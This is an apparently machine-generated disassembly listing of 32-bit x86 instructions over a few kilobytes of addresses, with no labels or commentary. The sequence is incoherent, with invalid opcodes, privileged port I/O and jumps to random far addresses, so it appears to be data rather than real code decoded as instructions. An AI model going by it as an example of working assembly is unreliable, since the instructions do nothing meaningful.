  41d576:	adc    ecx,DWORD PTR [esi-0x3f5a3798]
  41d57c:	inc    eax
  41d57d:	movaps xmm6,XMMWORD PTR [ecx]
  41d580:	xor    al,0xea
  41d582:	sub    bl,BYTE PTR [ecx]
  41d584:	sbb    ebx,DWORD PTR [esi-0x72f4b64b]
  41d58a:	out    dx,eax
  41d58b:	adc    BYTE PTR [eax+esi*2],al
  41d58e:	fdiv   DWORD PTR fs:[esi+ebx*8+0x2183de0]
  41d596:	lea    ecx,[edx-0x489c27c7]
  41d59c:	mov    ecx,0x116293ad
  41d5a1:	out    0x62,eax
  41d5a3:	sub    bl,BYTE PTR [eax+0x36]
  41d5a6:	jae    0x41d603
  41d5a8:	cmp    cl,BYTE PTR [eax]
  41d5aa:	xchg   edx,eax
  41d5ab:	mov    ah,0x10
  41d5ad:	pop    esp
  41d5ae:	cmp    al,BYTE PTR [ebx+edi*4-0x12519a8d]
  41d5b5:	fdiv   QWORD PTR [edi]
  41d5b7:	int3   
  41d5b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5b9:	push   cs
  41d5ba:	cs jne 0x41d54f
  41d5bd:	dec    ecx
  41d5be:	fcom   DWORD PTR [eax-0x15]
  41d5c1:	mov    eax,ds:0xc54cb2a7
  41d5c6:	data16 stos BYTE PTR es:[edi],al
  41d5c8:	outs   dx,DWORD PTR ds:[esi]
  41d5c9:	mov    esi,0x322cca35
  41d5ce:	aaa    
  41d5cf:	mov    ah,0xf4
  41d5d1:	std    
  41d5d2:	outs   dx,BYTE PTR ds:[esi]
  41d5d3:	cmp    eax,0x4863a9a7
  41d5d8:	xlat   BYTE PTR ds:[ebx]
  41d5d9:	push   es
  41d5da:	push   ebx
  41d5db:	dec    eax
  41d5dc:	adc    bh,dl
  41d5de:	adc    al,BYTE PTR [ebx]
  41d5e0:	inc    ebp
  41d5e1:	in     al,dx
  41d5e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5e3:	jg     0x41d64a
  41d5e5:	int3   
  41d5e6:	daa    
  41d5e7:	xchg   al,cl
  41d5e9:	in     al,0x3b
  41d5eb:	into   
  41d5ec:	and    al,0xd7
  41d5ee:	and    dl,BYTE PTR [eax+ebx*2]
  41d5f1:	je     0x41d670
  41d5f3:	sbb    al,BYTE PTR [edx-0x34169a0]
  41d5f9:	call   0xaa1:0xd07d4e49
  41d600:	out    0x0,eax
  41d602:	iret   
  41d603:	mov    esp,0x1e2d78b2
  41d608:	adc    BYTE PTR [edi+0x5b],bh
  41d60b:	sub    eax,0x40ed9ac5
  41d610:	js     0x41d684
  41d612:	repnz adc edi,DWORD PTR [esi+0xb]
  41d616:	jnp    0x41d67c
  41d618:	icebp  
  41d619:	mov    edi,ebp
  41d61b:	ja     0x41d5d0
  41d61d:	lock jg 0x41d5f8
  41d620:	mov    ebx,0x98a4df01
  41d625:	int3   
  41d626:	sahf   
  41d627:	cwde   
  41d628:	jp     0x41d5da
  41d62a:	in     al,dx
  41d62b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d62c:	inc    eax
  41d62d:	mov    dl,0x17
  41d62f:	test   DWORD PTR [edi+0x1b6c0658],edi
  41d635:	and    eax,0xc9607b43
  41d63a:	lea    edx,[edi]
  41d63c:	push   eax
  41d63d:	adc    BYTE PTR [edi],al
  41d63f:	fdiv   QWORD PTR [esi-0x2d]
  41d642:	pusha  
  41d643:	into   
  41d644:	inc    edi
  41d645:	jecxz  0x41d5f2
  41d647:	push   edi
  41d648:	dec    esp
  41d649:	ret    
  41d64a:	xchg   ebp,eax
  41d64b:	ret    0xf4c1
  41d64e:	cli    
  41d64f:	cmc    
  41d650:	xor    ebx,esi
  41d652:	dec    esi
  41d653:	mov    ecx,esp
  41d655:	aad    0xea
  41d657:	mov    dl,0xa9
  41d659:	ja     0x41d627
  41d65b:	sub    ecx,DWORD PTR [ebx-0x51]
  41d65e:	fs dec ebx
  41d660:	xlat   BYTE PTR ds:[ebx]
  41d661:	test   BYTE PTR [esi],ah
  41d663:	retf   
  41d664:	mov    edx,0x3018642c
  41d669:	jg     0x41d60a
  41d66b:	sbb    al,0x10
  41d66d:	xchg   ch,dh
  41d66f:	xchg   ebp,eax
  41d670:	xchg   esi,eax
  41d671:	xor    eax,0xf3202cf5
  41d676:	lds    esi,FWORD PTR [eax-0x37d8cde8]
  41d67c:	daa    
  41d67d:	mov    ecx,ebx
  41d67f:	jae    0x41d6f0
  41d681:	or     eax,0xb87c5a5d
  41d686:	fistp  QWORD PTR [ecx]
  41d688:	and    DWORD PTR [edx+0xe2d1460],ecx
  41d68e:	out    dx,al
  41d68f:	mov    edx,0x8375038a
  41d694:	aas    
  41d695:	push   0x8c04ff3e
  41d69a:	adc    BYTE PTR ds:0x52c99499,dl
  41d6a0:	lods   al,BYTE PTR ds:[esi]
  41d6a1:	jge    0x41d6dd
  41d6a3:	in     eax,0x55
  41d6a5:	mov    al,ds:0x2a5d45df
  41d6aa:	and    eax,0xf5984611
  41d6af:	sub    al,0x24
  41d6b1:	fadd   QWORD PTR [ebp-0x16]
  41d6b4:	pop    edi
  41d6b5:	push   eax
  41d6b6:	jo     0x41d701
  41d6b8:	mov    eax,ds:0xba28a3b1
  41d6bd:	mov    dl,0x8f
  41d6bf:	mov    cl,0xd2
  41d6c1:	xchg   ecx,eax
  41d6c2:	rcl    DWORD PTR [esi+0x26],1
  41d6c5:	xor    BYTE PTR [eax+0x47d8f4aa],dh
  41d6cb:	fidivr WORD PTR [edi-0xe]
  41d6ce:	test   edx,ebp
  41d6d0:	mov    edi,0x98e94c3f
  41d6d5:	jp     0x41d6ab
  41d6d7:	fdiv   st,st(1)
  41d6d9:	push   0x0
  41d6db:	sti    
  41d6dc:	dec    esp
  41d6dd:	mov    ds:0x46e0611,al
  41d6e2:	daa    
  41d6e3:	(bad)  
  41d6e4:	sub    ah,BYTE PTR [edi+0x5]
  41d6e7:	sub    eax,0xf6d4f53b
  41d6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6ed:	loopne 0x41d682
  41d6ef:	fs mov cl,0x78
  41d6f2:	pop    ebx
  41d6f3:	fldln2 
  41d6f5:	int3   
  41d6f6:	cli    
  41d6f7:	hlt    
  41d6f8:	sub    al,0x0
  41d6fa:	ret    
  41d6fb:	sbb    DWORD PTR [eax-0x41],0xffffffef
  41d6ff:	out    dx,al
  41d700:	adc    DWORD PTR [edi],esp
  41d702:	xor    eax,DWORD PTR [ebx-0x7b]
  41d705:	(bad)  
  41d706:	call   0x8c5a:0x2bcd6637
  41d70d:	push   ebx
  41d70e:	jle    0x41d6e7
  41d710:	sbb    eax,0xc2240a32
  41d715:	mov    bl,0x1c
  41d717:	das    
  41d718:	inc    ebp
  41d719:	test   DWORD PTR [edx],esi
  41d71b:	ret    0x82a0
  41d71e:	add    ecx,ecx
  41d720:	xchg   ebx,eax
  41d721:	jge    0x41d706
  41d723:	mov    ebx,0x60aca6ee
  41d728:	les    esp,FWORD PTR [esi+0x67]
  41d72b:	mov    bh,BYTE PTR [edi]
  41d72d:	data16 xor al,0x89
  41d730:	lock sti 
  41d732:	dec    eax
  41d733:	add    ecx,DWORD PTR [eax+0x0]
  41d736:	sub    DWORD PTR [edx+ebp*1+0x35],esp
  41d73a:	add    al,0x0
  41d73c:	cmp    eax,DWORD PTR [ecx-0x48cfaef7]
  41d742:	push   ecx
  41d743:	jecxz  0x41d794
  41d745:	imul   eax,edi,0x66
  41d748:	cmp    al,0xb5
  41d74a:	lock inc ebx
  41d74c:	mov    ecx,0xf59b7148
  41d751:	cli    
  41d752:	out    0x15,eax
  41d754:	enter  0xece1,0x8f
  41d758:	mov    bl,0xf6
  41d75a:	imul   esi,DWORD PTR [esi],0xffffffbc
  41d75d:	popa   
  41d75e:	into   
  41d75f:	test   BYTE PTR [edx],0x86
  41d762:	push   esp
  41d763:	dec    ebx
  41d764:	repz out dx,al
  41d766:	in     al,0xef
  41d768:	inc    esi
  41d769:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41d76b:	add    cl,BYTE PTR [ecx]
  41d76d:	ror    ebx,cl
  41d76f:	cmp    al,0xdc
  41d771:	cmp    DWORD PTR ds:0x4b605fb3,edi
  41d777:	and    bl,dl
  41d779:	fdivr  DWORD PTR [esi-0x8]
  41d77c:	mov    ah,0xdc
  41d77e:	sub    dh,BYTE PTR [ebp-0x591dab72]
  41d784:	sub    BYTE PTR [eax+0x1],bl
  41d787:	pusha  
  41d788:	push   cs
  41d789:	inc    edx
  41d78a:	or     eax,0x88584698
  41d78f:	aad    0x85
  41d791:	call   FWORD PTR [edi+0x7]
  41d794:	ss inc ebx
  41d796:	inc    esi
  41d797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d798:	cli    
  41d799:	and    dl,dh
  41d79b:	sahf   
  41d79c:	and    DWORD PTR [esi+0x316b8800],0x239341ae
  41d7a6:	adc    al,dl
  41d7a8:	xor    dh,BYTE PTR [ebx+0x0]
  41d7ab:	cmp    DWORD PTR [eax+0x38],0xffffffb5
  41d7af:	repz push 0x4b8b5258
  41d7b5:	cld    
  41d7b6:	dec    edx
  41d7b7:	or     ebp,DWORD PTR [eiz*2-0x59dbd711]
  41d7be:	cwde   
  41d7bf:	fmul   QWORD PTR [eax-0x35]
  41d7c2:	jne    0x41d78e
  41d7c4:	dec    ebp
  41d7c5:	mov    esi,DWORD PTR [ebp-0x48a49c5f]
  41d7cb:	inc    ebp
  41d7cc:	ficomp WORD PTR [ebx-0x30bafa7c]
  41d7d2:	out    0xf2,eax
  41d7d4:	jmp    0x9edf73f1
  41d7d9:	sub    BYTE PTR [esi],bh
  41d7db:	clc    
  41d7dc:	cli    
  41d7dd:	inc    edx
  41d7de:	mov    esp,DWORD PTR [edi]
  41d7e0:	xchg   BYTE PTR [edx+0x16],ah
  41d7e3:	out    dx,eax
  41d7e4:	out    dx,eax
  41d7e5:	retf   0x2f5e
  41d7e8:	pushf  
  41d7e9:	lock jbe 0x41d783
  41d7ec:	icebp  
  41d7ed:	push   0x34f20784
  41d7f2:	(bad)  
  41d7f3:	cmp    BYTE PTR [ebx],ah
  41d7f5:	xor    DWORD PTR [ebx-0x70],0xffffffb4
  41d7f9:	es retf 
  41d7fb:	sbb    al,0x9e
  41d7fd:	into   
  41d7fe:	xor    DWORD PTR [eax],edx
  41d800:	mov    DWORD PTR [ecx+eiz*1+0x1a5e8be],0xeb7a577e
  41d80b:	xor    DWORD PTR [ecx],ecx
  41d80d:	mov    bl,0xa4
  41d80f:	retf   0xf39e
  41d812:	jmp    0x2549:0xbabda0bc
  41d819:	in     eax,dx
  41d81a:	fnstcw WORD PTR [edx]
  41d81c:	xchg   ebx,eax
  41d81d:	nop
  41d81e:	retf   
  41d81f:	sub    esp,esp
  41d821:	xchg   ebx,eax
  41d822:	cmp    ch,dl
  41d824:	xchg   edx,eax
  41d825:	stc    
  41d826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d827:	pop    edi
  41d828:	xor    bl,dh
  41d82a:	cld    
  41d82b:	dec    esi
  41d82d:	sub    al,0x7e
  41d82f:	jo     0x41d7b7
  41d831:	sbb    al,0xee
  41d833:	(bad)  
  41d834:	xor    DWORD PTR [edx-0x589f5833],ecx
  41d83a:	mov    DWORD PTR [eax+0x2c],ecx
  41d83d:	div    DWORD PTR [ebp+0x6c]
  41d840:	adc    DWORD PTR [ecx],edi
  41d842:	pop    esi
  41d843:	inc    edx
  41d844:	neg    BYTE PTR ds:[esi]
  41d847:	jg     0x41d8bc
  41d849:	ss mov dl,0x41
  41d84c:	mov    ebp,0x4ed04e6c
  41d851:	out    0x65,eax
  41d853:	cmp    edx,edi
  41d855:	inc    edx
  41d856:	ins    BYTE PTR es:[edi],dx
  41d857:	aaa    
  41d858:	fstp   TBYTE PTR ds:0xbddd8f23
  41d85e:	es pushf 
  41d860:	jl     0x41d80a
  41d862:	sbb    al,cl
  41d864:	data16 std 
  41d866:	(bad)  
  41d867:	nop
  41d868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d869:	jge    0x41d871
  41d86b:	ss std 
  41d86d:	cs loope 0x41d8aa
  41d870:	imul   BYTE PTR [ebx-0x4c]
  41d873:	std    
  41d874:	daa    
  41d875:	jbe    0x41d85a
  41d877:	sbb    eax,0xdbbf472d
  41d87c:	jnp    0x41d815
  41d87e:	(bad)  
  41d87f:	jecxz  0x41d8b3
  41d881:	add    eax,0xd929fe2b
  41d886:	cmp    al,0xfa
  41d888:	push   ss
  41d889:	mov    bh,ah
  41d88b:	outs   dx,DWORD PTR ds:[esi]
  41d88c:	pushf  
  41d88d:	cdq    
  41d88e:	shr    BYTE PTR [edi+0x31],0x96
  41d892:	add    al,0xfc
  41d894:	xchg   DWORD PTR [ebx+ebp*2-0x695e11e0],eax
  41d89b:	pop    edx
  41d89c:	sbb    BYTE PTR [ecx],bl
  41d89e:	inc    edi
  41d89f:	nop
  41d8a0:	pushw  ds
  41d8a2:	jno    0x41d892
  41d8a4:	pop    ecx
  41d8a5:	(bad)  
  41d8a6:	std    
  41d8a7:	std    
  41d8a8:	call   0xa167:0x61f98fbb
  41d8af:	push   eax
  41d8b0:	clc    
  41d8b1:	sub    DWORD PTR [ecx-0x77],edi
  41d8b4:	inc    edx
  41d8b5:	(bad)  
  41d8b6:	push   cs
  41d8b7:	dec    esi
  41d8b8:	dec    edi
  41d8b9:	les    ebp,FWORD PTR [ebx-0x16]
  41d8bc:	loopne 0x41d84a
  41d8be:	lea    esi,[edi]
  41d8c0:	outs   dx,BYTE PTR ds:[esi]
  41d8c1:	icebp  
  41d8c2:	sahf   
  41d8c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8c4:	stos   BYTE PTR es:[edi],al
  41d8c5:	pop    eax
  41d8c6:	adc    esp,DWORD PTR [edi-0x49]
  41d8c9:	cmp    DWORD PTR [ebx],ecx
  41d8cb:	in     eax,dx
  41d8cc:	sar    DWORD PTR [eax],1
  41d8ce:	rcl    DWORD PTR [edi],0xb0
  41d8d1:	add    eax,0x267ae6d1
  41d8d6:	pop    es
  41d8d7:	repnz aaa 
  41d8d9:	lds    ecx,FWORD PTR [ebx+0x21b66d99]
  41d8df:	dec    eax
  41d8e0:	mov    ds:0xde8e18ae,al
  41d8e5:	xchg   ebx,eax
  41d8e6:	jb     0x41d95e
  41d8e8:	jnp    0x41d87a
  41d8ea:	inc    edi
  41d8eb:	and    eax,DWORD PTR [eax+0x72066f7c]
  41d8f1:	call   0x290a21d8
  41d8f6:	stos   DWORD PTR es:[edi],eax
  41d8f7:	lods   eax,DWORD PTR ds:[esi]
	...
  41dac4:	push   cs
  41dac5:	pop    esp
  41dac6:	mov    esp,0xffe7fe47
  41dacb:	pop    ebp
  41dacc:	es mov eax,0xc1dcfe17
  41dad2:	fwait
  41dad3:	cmp    eax,0x1da4f
  41dad8:	push   ds
  41dad9:	pop    es
  41dada:	add    BYTE PTR [eax],al
  41dadc:	xchg   edi,edi
  41dade:	push   ecx
  41dadf:	popf   
  41dae0:	aaa    
  41dae1:	adc    ebx,esp
  41dae3:	call   0x72f4:0x367c12b7
  41daea:	inc    edx
  41daeb:	lods   eax,DWORD PTR ds:[esi]
  41daec:	sub    esi,DWORD PTR [ebp-0x52948c32]
  41daf2:	stc    
  41daf3:	adc    al,0x1d
  41daf5:	push   edi
  41daf6:	adc    BYTE PTR [edi],bl
  41daf8:	sbb    BYTE PTR [esi],0xb6
  41dafb:	retf   
  41dafc:	jle    0x41db43
  41dafe:	dec    edx
  41daff:	les    esp,FWORD PTR [ebx-0x18cc5567]
  41db05:	adc    al,bh
  41db07:	jle    0x41db7f
  41db09:	jmp    0xe0ffd171
  41db0e:	pop    ebp
  41db0f:	mov    bh,0x4a
  41db11:	ficom  DWORD PTR [ebp-0x67]
  41db14:	dec    esp
  41db15:	sbb    BYTE PTR [ebx+0x65],dl
  41db18:	sub    esp,eax
  41db1a:	outs   dx,BYTE PTR ds:[esi]
  41db1b:	or     DWORD PTR [ecx-0x5],edi
  41db1e:	mov    WORD PTR [eax+0x6f],gs
  41db21:	mov    BYTE PTR [edx+edx*4-0x53a1ca3],bh
  41db28:	fild   WORD PTR [ecx]
  41db2a:	data16 aad 0x9d
  41db2d:	test   BYTE PTR [edx-0x51],dl
  41db30:	call   FWORD PTR [edi+0x2a]
  41db33:	sub    BYTE PTR [edi+0x74],dl
  41db36:	inc    edx
  41db37:	call   0xd98940d4
  41db3c:	mov    ebx,0x921e81f7
  41db41:	pop    eax
  41db42:	sbb    ch,BYTE PTR [ecx+edx*8-0x464ad540]
  41db49:	(bad)  
  41db4a:	hlt    
  41db4b:	mov    ebx,DWORD PTR [ebx+0x62bfd494]
  41db51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db52:	std    
  41db53:	neg    DWORD PTR gs:0x17457fcb
  41db5a:	mov    eax,ds:0xd2c6d820
  41db5f:	icebp  
  41db60:	dec    ecx
  41db61:	jl     0x41db64
  41db63:	pop    edx
  41db64:	outs   dx,DWORD PTR ds:[esi]
  41db65:	outs   dx,DWORD PTR gs:[esi]
  41db67:	retf   0x67bb
  41db6a:	dec    eax
  41db6b:	mov    bh,0xf4
  41db6d:	pop    ebx
  41db6e:	and    ah,BYTE PTR [ebx-0x59555187]
  41db74:	adc    al,ah
  41db76:	adc    esi,ebx
  41db78:	sbb    edi,eax
  41db7a:	cld    
  41db7b:	add    eax,DWORD PTR [eax]
  41db7d:	cwde   
  41db7e:	loopne 0x41db38
  41db80:	mov    ch,0x50
  41db82:	sub    cl,BYTE PTR [ebp-0x59]
  41db85:	aas    
  41db86:	pop    edx
  41db87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db88:	sahf   
  41db89:	mov    ch,0x73
  41db8b:	stos   BYTE PTR es:[edi],al
  41db8c:	pushf  
  41db8d:	mov    dh,0x92
  41db8f:	vaddsubps xmm7,xmm0,XMMWORD PTR [ecx]
  41db93:	push   cs
  41db94:	les    ebx,FWORD PTR [edi+0x7edf6dc]
  41db9a:	lahf   
  41db9b:	mov    esp,0x48ae70c
  41dba0:	repnz ds stos BYTE PTR es:[edi],al
  41dba3:	arpl   WORD PTR ds:0xaf1c7688,di
  41dba9:	aam    0x6
  41dbab:	or     edi,DWORD PTR [edi-0x7d]
  41dbae:	inc    esp
  41dbaf:	adc    al,0xa0
  41dbb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbb2:	mov    ebx,0x65a5c8b3
  41dbb7:	dec    eax
  41dbb8:	rol    BYTE PTR [eax-0x7e],0xc7
  41dbbc:	inc    esi
  41dbbd:	(bad)  
  41dbbe:	(bad)  
  41dbc0:	xlat   BYTE PTR ds:[ebx]
  41dbc1:	mov    es,esi
  41dbc3:	mov    ds,WORD PTR [edx+eiz*1]
  41dbc6:	sub    BYTE PTR ds:0xe4695d35,dl
  41dbcc:	push   ebp
  41dbcd:	outs   dx,BYTE PTR ds:[esi]
  41dbce:	and    DWORD PTR [ebx-0x581d4408],ebx
  41dbd4:	cdq    
  41dbd5:	popa   
  41dbd6:	inc    ebx
  41dbd7:	pop    ecx
  41dbd8:	aam    0xd5
  41dbda:	fld    DWORD PTR [esi+0x6fec11d0]
  41dbe0:	lahf   
  41dbe1:	jp     0x41dc04
  41dbe3:	adc    DWORD PTR [eax-0x416fb3dd],0x46
  41dbea:	lods   eax,DWORD PTR ds:[esi]
  41dbeb:	daa    
  41dbec:	pop    ebp
  41dbed:	dec    esp
  41dbee:	xchg   ah,bh
  41dbf0:	aad    0xcc
  41dbf2:	add    DWORD PTR [ecx-0x13522235],ecx
  41dbf8:	loope  0x41dbe3
  41dbfa:	(bad)  
  41dbfb:	in     eax,0x71
  41dbfd:	in     al,0xfe
  41dbff:	and    esp,DWORD PTR ds:0x54f8c4d2
  41dc05:	inc    eax
  41dc06:	dec    ebp
  41dc07:	(bad)  
  41dc08:	in     eax,0x8d
  41dc0a:	or     al,0xbf
  41dc0c:	fwait
  41dc0d:	std    
  41dc0e:	dec    ecx
  41dc0f:	cmp    BYTE PTR [edi+eiz*8-0x70],al
  41dc13:	jmp    0x395b1dd3
  41dc18:	adc    esp,DWORD PTR [esi+0xf353143]
  41dc1e:	inc    ebx
  41dc1f:	push   ebx
  41dc20:	hlt    
  41dc21:	jnp    0x41dbf8
  41dc23:	cmp    esp,ecx
  41dc25:	jg     0x41dbe3
  41dc27:	pop    es
  41dc28:	cwde   
  41dc29:	int3   
  41dc2a:	aad    0xce
  41dc2c:	repz mov cl,bl
  41dc2f:	(bad)  
  41dc30:	pop    eax
  41dc31:	adc    ah,BYTE PTR [ecx-0x15]
  41dc34:	outs   dx,BYTE PTR ds:[esi]
  41dc35:	add    eax,0x8547c156
  41dc3a:	pop    es
  41dc3b:	or     ebp,ebx
  41dc3d:	js     0x41dca7
  41dc3f:	fcom   DWORD PTR [ebx-0x52896992]
  41dc45:	xchg   ecx,eax
  41dc46:	test   al,0x3f
  41dc48:	mov    WORD PTR [ebp+0x412e0413],fs
  41dc4e:	cmp    DWORD PTR [ebx+0x4a],ecx
  41dc51:	mov    dl,0xdf
  41dc53:	push   ss
  41dc54:	mov    eax,0x33138019
  41dc59:	push   esi
  41dc5a:	outs   dx,DWORD PTR ds:[esi]
  41dc5b:	adc    al,0xb
  41dc5d:	fcomp  st(3)
  41dc5f:	pushf  
  41dc60:	pcmpeqb mm4,QWORD PTR [eax-0xbed685]
  41dc67:	imul   ecx,DWORD PTR [ebp+0x65],0xffffff8b
  41dc6b:	sub    al,0xff
  41dc6d:	dec    eax
  41dc6e:	or     eax,0xeb1d5fa8
  41dc73:	cld    
  41dc74:	xchg   ebx,ecx
  41dc76:	jno    0x41dc1e
  41dc78:	sub    al,0x40
  41dc7a:	cmp    BYTE PTR [esp+eax*8+0x24],ah
  41dc7e:	cmp    esi,DWORD PTR [edx+0xa97e220]
  41dc84:	jnp    0x41dc75
  41dc86:	(bad)  
  41dc87:	and    al,0xac
  41dc89:	icebp  
  41dc8a:	fcomp  QWORD PTR ds:0x6aac267f
  41dc90:	inc    eax
  41dc91:	pop    eax
  41dc92:	xor    DWORD PTR [ecx],0xc76bb8b4
  41dc98:	frstor [esi+eiz*2+0x108b4e1b]
  41dc9f:	inc    ebx
  41dca0:	cmp    eax,0xf032b3c7
  41dca5:	jb     0x41dc45
  41dca7:	int3   
  41dca8:	out    dx,al
  41dca9:	or     BYTE PTR [ebx+ebx*1],ah
  41dcac:	push   0x5ccc3001
  41dcb1:	adc    eax,0xb70f3885
  41dcb6:	(bad)  
  41dcb7:	fadd   QWORD PTR [edi+0x9b11969]
  41dcbd:	cli    
  41dcbe:	rcr    DWORD PTR [eax+edx*8+0x17],0x8d
  41dcc3:	inc    eax
  41dcc4:	lahf   
  41dcc5:	add    al,0x43
  41dcc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcc8:	cmp    edi,DWORD PTR [esi+edi*1]
  41dccb:	add    ebp,esi
  41dccd:	rol    DWORD PTR [eax],1
  41dccf:	push   ss
  41dcd0:	push   es
  41dcd1:	inc    ecx
  41dcd2:	mov    al,ds:0x3e94cc8f
  41dcd7:	mov    DWORD PTR [esi+esi*8-0xfc33b02],edx
  41dcde:	sbb    al,0x28
  41dce0:	call   0xe343:0xf0a0c58d
  41dce7:	push   edx
  41dce8:	jae    0x41dc9f
  41dcea:	in     al,0x71
  41dcec:	fdivrp st(5),st
  41dcee:	pop    esi
  41dcef:	sub    BYTE PTR [ecx],ah
  41dcf1:	push   ebx
  41dcf2:	sti    
  41dcf3:	cmc    
  41dcf4:	test   BYTE PTR [eax+0x33],al
  41dcf7:	(bad)  
  41dcf8:	fs and eax,0xfee8ffa6
  41dcfe:	mov    ch,0xb0
  41dd00:	sub    DWORD PTR cs:[esi-0x515104d5],ecx
  41dd07:	sub    eax,0xd6c7cd04
  41dd0c:	mov    esp,0x3f2dda60
  41dd11:	push   ss
  41dd12:	dec    edi
  41dd13:	inc    edi
  41dd14:	leave  
  41dd15:	inc    edi
  41dd16:	fwait
  41dd17:	add    DWORD PTR [eax-0x1ed19a5c],edx
  41dd1d:	add    eax,0x8e41cb5d
  41dd22:	mov    ?,WORD PTR [ecx+0x3f305c8a]
  41dd28:	pop    es
  41dd29:	push   cs
  41dd2a:	jne    0x41dda5
  41dd2c:	mov    cl,0x8b
  41dd2e:	add    bh,cl
  41dd30:	into   
  41dd31:	into   
  41dd32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd33:	pop    ds
  41dd34:	xchg   esp,eax
  41dd35:	mov    eax,ds:0x4b325db2
  41dd3a:	mov    al,0xce
  41dd3c:	and    eax,0x36e1cee2
  41dd41:	fisubr DWORD PTR [ecx+0x2e]
  41dd44:	push   0xfffffff5
  41dd46:	sub    BYTE PTR [edi+edx*1+0x735b9609],dl
  41dd4d:	je     0x41dd1c
  41dd4f:	adc    bh,BYTE PTR [ecx+eiz*2+0x2776227a]
  41dd56:	iret   
  41dd57:	pop    edi
  41dd58:	jae    0x41dd85
  41dd5a:	and    esi,ecx
  41dd5c:	jno    0x41dd75
  41dd5e:	mov    esp,0x25e38019
  41dd63:	les    edx,FWORD PTR [eax-0x374b4454]
  41dd69:	sar    DWORD PTR [ebp-0x221c7e7b],0xbf
  41dd70:	inc    BYTE PTR [ebp-0xd]
  41dd73:	repz push 0x32294050
  41dd79:	in     eax,dx
  41dd7a:	fnsave [ebx-0x6c]
  41dd7d:	fucom  st(0)
  41dd7f:	pushf  
  41dd80:	xor    BYTE PTR [eax-0x606d4f40],dl
  41dd86:	mov    edi,0x1ba25335
  41dd8b:	mov    WORD PTR [edx+ecx*4],ds
  41dd8e:	fadd   st(6),st
  41dd90:	inc    edx
  41dd91:	jp     0x41dd50
  41dd93:	mov    eax,0xf169da05
  41dd98:	call   0xcb65a2b6
  41dd9d:	fnstcw WORD PTR es:[ebx+0xa]
  41dda1:	or     bl,BYTE PTR [eax+esi*8+0x1b]
  41dda5:	jb     0x41dd9c
  41dda7:	add    DWORD PTR [eax],edx
  41dda9:	fisub  DWORD PTR [edx*8+0x4a3f25e5]
  41ddb0:	and    edx,edx
  41ddb2:	fcmovu st,st(4)
  41ddb4:	retf   0xe852
  41ddb7:	div    DWORD PTR [ecx]
  41ddb9:	sbb    esi,DWORD PTR [esi+0x7705e2c5]
  41ddbf:	xor    ecx,ecx
  41ddc1:	mov    bh,0xf9
  41ddc3:	mov    bh,0x9e
  41ddc5:	test   eax,0x850a799c
  41ddca:	jmp    0xe1ff:0xce30ba17
  41ddd1:	sub    bl,ah
  41ddd3:	in     eax,0xe7
  41ddd5:	retf   0x29c6
  41ddd8:	pop    eax
  41ddd9:	int    0x4d
  41dddb:	loope  0x41de29
  41dddd:	enter  0x56e3,0x6f
  41dde1:	mov    ch,0x45
  41dde3:	and    cl,bl
  41dde5:	jp     0x41de52
  41dde7:	sbb    BYTE PTR [eax-0x20400765],0x45
  41ddee:	outs   dx,BYTE PTR ds:[esi]
  41ddef:	(bad)  
  41ddf0:	and    al,BYTE PTR [esi+0x4e]
  41ddf3:	pop    esi
  41ddf4:	mov    BYTE PTR [esi+0x63],cl
  41ddf7:	fisubr DWORD PTR [esi+edi*1]
  41ddfa:	dec    edi
  41ddfb:	pop    esp
  41ddfc:	jb     0x41dd8f
  41ddfe:	dec    eax
  41ddff:	mov    fs:0xf1fe4af2,eax
  41de05:	push   edx
  41de06:	sbb    ebp,ebx
  41de08:	jmp    0xcdbb:0xca72def2
  41de0f:	add    al,0x74
  41de11:	inc    edx
  41de12:	sti    
  41de13:	sbb    al,0xa0
  41de15:	imul   ebx,DWORD PTR [edi-0x1d],0xffffff88
  41de19:	dec    eax
  41de1a:	and    cl,cl
  41de1c:	enter  0xfff8,0xb1
  41de20:	iret   
  41de21:	sub    eax,ebp
  41de23:	or     ebx,DWORD PTR [edx-0x632cd16a]
  41de29:	fs inc eax
  41de2b:	loop   0x41de1b
  41de2d:	mov    esp,0x7a6f9c14
  41de32:	sub    eax,0x36f6006c
  41de37:	in     eax,0xd3
  41de39:	int3   
  41de3a:	fwait
  41de3b:	xor    esp,ebx
  41de3d:	aad    0x7b
  41de3f:	jno    0x41ddca
  41de41:	push   esi
  41de42:	sbb    BYTE PTR [edi-0x52],al
  41de45:	mov    eax,ss
  41de47:	pop    ebx
  41de48:	shr    DWORD PTR [ebp+0x2a],cl
  41de4b:	inc    ecx
  41de4c:	retf   0xed26
  41de4f:	jbe    0x41de49
  41de51:	mov    BYTE PTR [eax],ch
  41de53:	add    edx,esp
  41de55:	hlt    
  41de56:	je     0x41de5b
  41de58:	addr16 dec ebx
  41de5a:	jg     0x41dea1
  41de5c:	call   DWORD PTR [edx-0x14c20e98]
  41de62:	sub    dl,BYTE PTR [edi-0x230c1c21]
  41de68:	fld    QWORD PTR [esi+eiz*4-0x7ea9953e]
  41de6f:	repnz xchg edi,eax
  41de71:	add    al,0x56
  41de73:	jns    0x41de96
  41de75:	das    
  41de76:	cwde   
  41de77:	add    al,cl
  41de79:	mov    edi,0xcf2da80b
  41de7e:	ret    
  41de7f:	xchg   DWORD PTR [edx-0x10],eax
  41de82:	in     al,dx
  41de83:	fadd   DWORD PTR [ecx+ebp*4]
  41de86:	mov    ds:0x4c4b79b9,al
  41de8b:	xchg   BYTE PTR [eax+0x34f3a70f],cl
  41de91:	push   edx
  41de92:	lods   eax,DWORD PTR ds:[esi]
  41de93:	sbb    al,0x9f
  41de95:	push   esi
  41de96:	push   eax
  41de97:	pop    es
  41de98:	and    al,0xea
  41de9a:	xlat   BYTE PTR ds:[ebx]
  41de9b:	dec    ecx
